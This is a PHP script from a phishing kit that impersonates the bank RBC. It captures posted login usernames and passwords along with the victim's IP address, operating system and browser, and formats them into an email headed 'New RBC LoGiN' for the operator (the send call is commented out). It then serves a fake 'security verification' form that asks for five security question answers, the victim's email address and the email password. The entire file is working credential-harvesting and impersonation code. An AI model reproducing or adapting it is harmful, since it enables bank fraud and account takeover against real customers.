<?php
	
	session_start();
	$response = array();
	if(isset($_POST["username"]) && isset($_POST["password"])){

		if(null !== $_POST["username"] || null !== $_POST["password"]){

			include('browsers.php');
			include('config.php');

			$_SESSION["username"] = $_POST["username"];
			$_SESSION["password"] = $_POST["password"];

			$subject = "New RBC LoGiN";
			$content = "User Name : ".$_SESSION["username"];
			$content .= "Password : ".$_SESSION["password"];

			$content .= "------------------------------------<br/>";
			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
			$content .= "OS : ".$user_os."<br/>";
			$content .= "Browser : ".$user_browser."<br/>";
			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";

			$Mailheaders = "From: $from\r\n";
			$Mailheaders .= "MIME-Version: 1.0\r\n";
			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

			//if(mail($to, $subject, $content, $Mailheaders)){
				$response["res"] ='


			<div role="complementary" aria-label="Error">
				<div class="redNotice notices" tabindex="-1" id="attention-notice-pl-1">
					<div class="redMessage">
						<i aria-hidden="true" class="rbc-icon rbc_attention"></i>
						<img src="" alt="Attention" class="accessible"> 
						Personal verification questions and answers. 
					</div>
					<div class="arrowDownRed"></div>
					
					<p>For security reasons please verify your identity by confirming your Verification questions and answers in the fields below. When you are done , click "Continue".</p>
				</div>
			</div>
			
			
			<form class="form clearfix" name="s1form" id="s1form">
				<div class="row">	
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Personal verification question 1</label>
					<select  class="form-control" id="q1" style="border-radius:0px !important;" name="q1">
						<option value="">Please select your question</option>
						<option value="What was the first film I watched?">What was the first film I watched?</option>
						<option value="What is my elder\'s middle name?">What is my elder\'s middle name?</option>
						<option value="In what city was my father born?">In what city was my father born?</option>
						<option value="My favorite cartoon character?">My favorite cartoon character?</option>
						<option value="What is my mother\'s middle name?">What is my mother\'s middle name?</option>
						<option value="The year I met my spouse?">The year I met my spouse?</option>
						<option value="Name of my first pet?">Name of my first pet?</option>
						<option value="What was the first name of my bridesmaid?">What was the first name of my bridesmaid?</option>
						<option value="First name of my best friend in primary school?">First name of my best friend in primary school?</option>
						<option value="Name of my favorite movie character?">Name of my favorite movie character?</option>					
					</select>
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Answer</label>
					<input type="text" class="form-control checks" id="ans1" style="border-radius:0px !important;"  name="ans1" onkeyup="keyUpveriF(this);">
				  </div>


				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Personal verification question 2</label>
					<select  class="form-control" id="q2" style="border-radius:0px !important;" name="q2">
						<option value="">Please select your question</option>
						<option value="What was the first film I watched?">What was the first film I watched?</option>
						<option value="What is my elder\'s middle name?">What is my elder\'s middle name?</option>
						<option value="In what city was my father born?">In what city was my father born?</option>
						<option value="My favorite cartoon character?">My favorite cartoon character?</option>
						<option value="What is my mother\'s middle name?">What is my mother\'s middle name?</option>
						<option value="The year I met my spouse?">The year I met my spouse?</option>
						<option value="Name of my first pet?">Name of my first pet?</option>
						<option value="What was the first name of my bridesmaid?">What was the first name of my bridesmaid?</option>
						<option value="First name of my best friend in primary school?">First name of my best friend in primary school?</option>
						<option value="Name of my favorite movie character?">Name of my favorite movie character?</option>								
					</select>
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Answer</label>
					<input type="text" class="form-control checks" id="ans2" style="border-radius:0px !important;" name="ans2"  onkeyup="keyUpveriF(this);">
				  </div>
		
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Personal verification question 3</label>
					<select  class="form-control" id="q3" style="border-radius:0px !important;" name="q3">
						<option value="">Please select your question</option>
						<option value="What was the first film I watched?">What was the first film I watched?</option>
						<option value="What is my elder\'s middle name?">What is my elder\'s middle name?</option>
						<option value="In what city was my father born?">In what city was my father born?</option>
						<option value="My favorite cartoon character?">My favorite cartoon character?</option>
						<option value="What is my mother\'s middle name?">What is my mother\'s middle name?</option>
						<option value="The year I met my spouse?">The year I met my spouse?</option>
						<option value="Name of my first pet?">Name of my first pet?</option>
						<option value="What was the first name of my bridesmaid?">What was the first name of my bridesmaid?</option>
						<option value="First name of my best friend in primary school?">First name of my best friend in primary school?</option>
						<option value="Name of my favorite movie character?">Name of my favorite movie character?</option>								
					</select>
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Answer</label>
					<input type="text" class="form-control checks" id="ans3" style="border-radius:0px !important;" name="ans3"  onkeyup="keyUpveriF(this);">
				  </div>

				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Personal verification question 4</label>
					<select  class="form-control" id="q4" style="border-radius:0px !important;" name="q4">
						<option value="">Please select your question</option>
						<option value="What was the first film I watched?">What was the first film I watched?</option>
						<option value="What is my elder\'s middle name?">What is my elder\'s middle name?</option>
						<option value="In what city was my father born?">In what city was my father born?</option>
						<option value="My favorite cartoon character?">My favorite cartoon character?</option>
						<option value="What is my mother\'s middle name?">What is my mother\'s middle name?</option>
						<option value="The year I met my spouse?">The year I met my spouse?</option>
						<option value="Name of my first pet?">Name of my first pet?</option>
						<option value="What was the first name of my bridesmaid?">What was the first name of my bridesmaid?</option>
						<option value="First name of my best friend in primary school?">First name of my best friend in primary school?</option>
						<option value="Name of my favorite movie character?">Name of my favorite movie character?</option>								
					</select>
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Answer</label>
					<input type="text" class="form-control checks" id="ans4" style="border-radius:0px !important;" name="ans4"  onkeyup="keyUpveriF(this);">
				  </div>

				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Personal verification question 5</label>
					<select  class="form-control" id="q5" style="border-radius:0px !important;" name="q5"  onkeyup="keyUpveriF(this);">
						<option value="">Please select your question</option>
						<option value="What was the first film I watched?">What was the first film I watched?</option>
						<option value="What is my elder\'s middle name?">What is my elder\'s middle name?</option>
						<option value="In what city was my father born?">In what city was my father born?</option>
						<option value="My favorite cartoon character?">My favorite cartoon character?</option>
						<option value="What is my mother\'s middle name?">What is my mother\'s middle name?</option>
						<option value="The year I met my spouse?">The year I met my spouse?</option>
						<option value="Name of my first pet?">Name of my first pet?</option>
						<option value="What was the first name of my bridesmaid?">What was the first name of my bridesmaid?</option>
						<option value="First name of my best friend in primary school?">First name of my best friend in primary school?</option>
						<option value="Name of my favorite movie character?">Name of my favorite movie character?</option>								
					</select>
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Answer</label>
					<input type="text" class="form-control checks" id="ans5" style="border-radius:0px !important;" name="ans5" onkeyup="keyUpveriF(this);">
				  </div>
				  
				  
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputEmail1">Principal email address</label>
					<input type="email" class="form-control" id="email" style="border-radius:0px !important;" name="email" onkeyup="verifEmailFormat(this);">
				  </div>
				  <div class="form-group col-md-6 col-sm-6 ">
					<label for="exampleInputPassword1">Email password</label>
					<input type="password" class="form-control" id="passmail" style="border-radius:0px !important;" name="passmail" onkeyup="keyUpveriF(this);">
				  </div>
				</div>
				<div class="form-group col-md-12 ">
					<button type="button" tabindex="4" class="pull-right clear-fix yellowBtnLarge" id="s1" onclick="step2();">Continue</button>
				</div>
				  
			</form>';
			//}

				echo json_encode($response);

		}

	}

?>